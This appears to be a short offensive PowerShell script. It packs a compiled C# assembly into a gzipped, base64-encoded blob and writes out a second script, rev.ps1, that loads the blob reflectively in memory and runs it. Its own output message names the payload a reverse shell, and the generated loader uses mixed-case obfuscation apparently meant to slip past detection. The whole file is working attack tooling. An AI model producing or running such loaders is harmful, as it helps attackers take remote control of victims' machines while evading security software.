param([parameter(mandatory)] $File)
$bytes = [System.IO.File]::ReadAllBytes($File)
[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$outStream.Close()
[byte[]] $outBytes = $outStream.ToArray()
$b64Zipped = [System.Convert]::ToBase64String($outBytes)

$reflection_code = @"
`$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg("$b64Zipped"))
`$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM(`$a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
`$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
`$dEcoMPReSSEd.copYto( `$outPUt )
[BYte[]]`$ByTEOuTarrAy = `$OUtPUT.toarrAY()
`$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load(`$bYTeOUTArraY)
[rev.Program]::Main(0)
"@

Write-Host "[+] Written the C# Embedded Reflection Reverse Shell into rev.ps1"
$reflection_code | Out-File rev.ps1